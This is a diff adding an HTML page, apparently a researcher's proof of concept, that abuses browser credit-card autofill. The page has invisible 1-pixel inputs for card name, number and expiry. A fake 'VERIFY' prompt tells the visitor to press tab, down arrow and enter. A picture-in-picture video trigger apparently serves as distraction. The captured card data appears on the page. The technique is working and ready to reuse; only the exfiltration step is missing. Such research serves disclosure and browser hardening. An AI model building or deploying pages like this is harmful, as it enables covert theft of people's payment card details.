@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Credit Card Autofill Test</title>
+  <style>
+    .output-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: white;
+      padding: 10px;
+      border-bottom: 2px solid #ccc;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .pip-button {
+      margin-top: 10px;
+      padding: 8px 12px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .form-container {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: white;
+      padding: 10px;
+      border-top: 2px solid #ccc;
+      text-align: center;
+    }
+
+    .green-box {
+      background-color: green;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      width: 300px;
+      height: 160px;
+      border-radius: 10px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .tiny-input {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      border: none;
+      opacity: 0;
+    }
+
+    #ccName {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      border: none;
+      pointer-events: auto;
+    }
+
+    body {
+      margin-top: 150px;
+      margin-bottom: 150px;
+    }
+
+    /* POC note in the middle of the screen */
+    .poc-note {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 40px;
+      font-weight: bold;
+      color: black;
+      z-index: 999;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Output at the top -->
+  <div class="output-container">
+    <p id="output">(No output yet...)</p>
+    <button class="pip-button" onclick="playPiP()">VERIFY</button>
+  </div>
+
+  <!-- POC note in center -->
+  <div class="poc-note">
+    Verify & Press tab + down arrow + enter
+  </div>
+
+  <!-- Hidden Video Element -->
+  <video id="videoPlayer" src="video.mp4" hidden></video>
+
+  <!-- Form at bottom -->
+  <div class="form-container">
+    <div class="green-box">VERIFY HERE</div>
+
+    <form id="ccForm">
+      <label for="ccName"></label>
+      <input id="ccName" name="cc-name" autocomplete="cc-name" />
+
+      <!-- Hidden autofill fields -->
+      <input id="ccNumber" name="cc-number" autocomplete="cc-number" class="tiny-input" />
+      <input id="ccExpMonth" name="cc-exp-month" autocomplete="cc-exp-month" class="tiny-input" />
+      <input id="ccExpYear" name="cc-exp-year" autocomplete="cc-exp-year" class="tiny-input" />
+    </form>
+  </div>
+
+  <script>
+    const ccForm = document.getElementById('ccForm');
+    const ccInputs = ccForm.querySelectorAll('input');
+    const ccNameInput = document.getElementById('ccName');
+    const output = document.getElementById('output');
+    const video = document.getElementById('videoPlayer');
+
+    window.onload = () => {
+      ccNameInput.focus();
+    };
+
+    const updateOutput = () => {
+      const inputValues = [];
+      ccInputs.forEach(elem => {
+        if (elem.value.trim()) {
+          inputValues.push(elem.name + ": " + elem.value);
+        }
+      });
+      output.innerText = "Entered Info: \n" + inputValues.join('\n');
+    };
+
+    ccInputs.forEach(input => {
+      input.addEventListener('input', updateOutput);
+    });
+
+    async function playPiP() {
+      try {
+        await video.play();
+        await video.requestPictureInPicture();
+      } catch (error) {
+        console.error("PiP Error:", error);
+      }
+    }
+  </script>
+</body>
+</html>
